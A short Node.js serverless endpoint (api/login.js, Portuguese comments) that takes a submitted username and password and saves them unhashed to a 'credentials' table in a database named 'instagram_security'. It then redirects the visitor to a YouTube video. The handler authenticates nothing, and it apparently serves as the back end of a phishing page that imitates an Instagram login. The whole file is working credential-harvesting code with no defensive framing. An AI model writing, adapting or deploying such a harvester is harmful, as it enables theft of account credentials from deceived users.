// api/login.js
const { parse } = require('urlencoded-body-parser');
const mysql = require('mysql2/promise');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).send('Method Not Allowed');
    return;
  }

  try {
    // Lê o corpo do POST
    const body = await parse(req);
    const { username, password } = body;

    // Conecta ao MySQL local
    const connection = await mysql.createConnection({
      host: process.env.DB_HOST || 'localhost',
      user: process.env.DB_USER || 'instauser',
      password: process.env.DB_PASS || 'SENHA_FORTE_AQUI',
      database: process.env.DB_NAME || 'instagram_security',
    });

    // Insere na tabela credentials
    await connection.execute(
      'INSERT INTO credentials (username, password) VALUES (?, ?)',
      [username, password]
    );

    await connection.end();

    // Redireciona para o YouTube
    res.writeHead(302, { Location: 'https://www.youtube.com/shorts/m5-8zmoXaQA' });
    res.end();
  } catch (error) {
    console.error('Erro ao salvar no banco:', error);
    res.status(500).send('Erro ao salvar as credenciais no banco');
  }
};
